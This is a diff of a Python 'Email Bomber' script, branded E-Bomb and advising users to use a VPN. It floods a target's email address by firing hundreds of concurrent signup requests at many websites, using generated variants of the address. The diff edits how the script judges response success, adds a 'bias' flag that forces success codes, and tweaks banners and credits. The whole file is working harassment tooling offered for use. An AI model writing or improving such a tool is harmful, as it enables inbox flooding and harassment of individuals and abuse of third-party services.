@@ -12,40 +12,6 @@ import asyncio, aiohttp, time, re, random, string, itertools, os, json, pystyle,
 from pystyle import Center
 from colorama import Fore, Style, init
 
-try:
-    import requests
-    import asyncio
-    import aiohttp
-    import time
-    import re
-    import random
-    import string
-    import itertools
-    import os
-    import json
-    import pystyle
-    import fade
-    import sys
-    import colorama
-    import threading
-
-except ModuleNotFoundError:
-    os.system('pip install requests')
-    os.system('pip install asyncio')
-    os.system('pip install aiohttp')
-    os.system('pip install time')
-    os.system('pip install re')
-    os.system('pip install random')
-    os.system('pip install string')
-    os.system('pip install itertools')
-    os.system('pip install os')
-    os.system('pip install json')
-    os.system('pip install pystyle')
-    os.system('pip install fade')
-    os.system('pip install colorama')
-    os.system('pip install threading')
-                            
-                            
 size = 600  # Threads + Process / Iterations
 cap = None  # thread limit / set to None for unlimited. Only go higher than 500 is u got a fucking beast of a pc CPU wise.
 random_threads = True  # True = Threads Random. False = They Arent Random
@@ -69,14 +35,14 @@ def update_title():
         os.system(f"title {title}" if os.name == "nt" else f"\033]0;{title}\007")
         time.sleep(0.2)
 
-# holy fuck i need to work on this and make it more organised
+# fuck this looks so ugly but it works
 def credit():
     clear_console()
     time.sleep(0.5)
     clear_console()
     print(Center.XCenter(faded_credits))
     time.sleep(5)
-    
+
     # skidded from chatgpt
 def generate_email_variants(email):
     username, domain = email.split("@")
@@ -150,7 +116,7 @@ async def fetch(
     sub: str,
     info,
     name: str = None,
-    testing: bool = False,
+    bias: bool = False,
 ):
     def fix(lol):
         try:
@@ -202,7 +168,6 @@ async def fetch(
             if status_codes.get(name) is None:
                 status = resp.status
                 resp = await resp.text()
-                evaluation = "FAILURE" if status >= 400 else "SUCCESS"
                 if is_html_string(resp):
                     words = [
                         "Denied",
@@ -234,8 +199,7 @@ async def fetch(
                         "An account using this email address has already been registered.",
                         "Permission Denied",
                     ]
-                    if any([word in evaluation.lower() for word in words]):
-                        evaluation = "FAILURE"
+                    if any([word.lower() in resp.lower() for word in words]):
                         status = 400
                 resp = (
                     resp.strip()
@@ -244,10 +208,11 @@ async def fetch(
                     .replace("\t", "")[:1000]
                 )
                 if status_codes.get(name) is None:
+                    if info.get("bias") == True:
+                        status = 200
                     status_codes[name] = {
                         "method": method,
                         "status": status,
-                        "evaluation": evaluation,
                         "url": url,
                         "resp": resp,
                     }
@@ -263,10 +228,8 @@ text = """
                         ██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
                         ███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
                         ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
-                                                       t.me/influenceable
+                                                      t.me/influenceable
                                                         pls use a vpn :)
-                                                        
-                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                        
 """
 
 credits = """   
@@ -278,14 +241,11 @@ credits = """
                         ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
                         
                         
-                                        =+= Credits =+=
-                                          Email Bomber
-                                       Founder: Inkthirsty
-                                       Sigma Dev: Disbuted  
-                                  =+= Keep Open Source Open =+=
-                                  
-                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                                  
+                                          =+= Credits =+=
+                                            Email Bomber
+                                         Founder: Inkthirsty
+                                         Sigma Dev: Disbuted
+                                    =+= Keep Open Source Open =+=
 """ 
 
 def menu():
@@ -299,11 +259,10 @@ def menu():
     choice = input("                                                     Enter your choice: ")
     return choice
 
-# banners
 faded_text = fade.purpleblue(text)
 faded_credits = fade.purpleblue(credits)
 
-# ui colours
+# Main Colours
 yellow_dash = f"{Fore.YELLOW}-{Style.RESET_ALL}"
 red_dash = f"{Fore.RED}-{Style.RESET_ALL}"
 green_dash = f"{Fore.GREEN}-{Style.RESET_ALL}"
@@ -339,7 +298,6 @@ async def main():
                     clear_console()
                     print(Center.XCenter(faded_text))
 
-            # functions = {i: functions[i] for i in list(functions)[:-1]}
             functions = {
                 i: functions[i]
                 for i in list(functions)
@@ -355,7 +313,6 @@ async def main():
                 string.ascii_lowercase,
                 string.ascii_uppercase,
                 string.digits,
-                # No more special characters, some websites hate that
             ]
             for _ in samples:
                 password += "".join(random.sample(_, k=5))
@@ -434,7 +391,7 @@ async def main():
                     f"\r[{green_dash}] Pretesting endpoints to grant 2 minutes of life ♥ ♥ ♥"
                 )
                 test_tasks = [
-                    asyncio.create_task(fetch(session, email, values, name, True))
+                    asyncio.create_task(fetch(session, email, values, name))
                     for name, values in functions.items()
                 ]
                 total = len(test_tasks)
@@ -494,7 +451,7 @@ async def main():
                 e = "\n\n".join(
                     [
                         (
-                            f"{name or 'Unknown'} -- {values.get('method')} -- {values.get('status')} -- {values.get('evaluation')}\nURL: {values.get('url')}\nRESPONSE: {values.get('resp')}"
+                            f"{name or 'Unknown'} -- {values.get('method')} -- {values.get('status')}\nRESPONSE: {values.get('resp')}"
                         )
                         for name, values in status_codes.items()
                     ]
@@ -511,6 +468,7 @@ async def main():
         await asyncio.sleep(5)
         sys.exit()
 
+
 if __name__ == "__main__":
     try:
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
@@ -526,7 +484,7 @@ if __name__ == "__main__":
             clear_console()
             print(Center.XCenter(faded_text))
             print(f"\r\n                                                 [{green_dash}] Thank You For Using E-Bomb!")
-            time.sleep(3) # why the fuck was this set to 20 seconds.... sigma
+            time.sleep(20)
             sys.exit()
         else:
             clear_console()
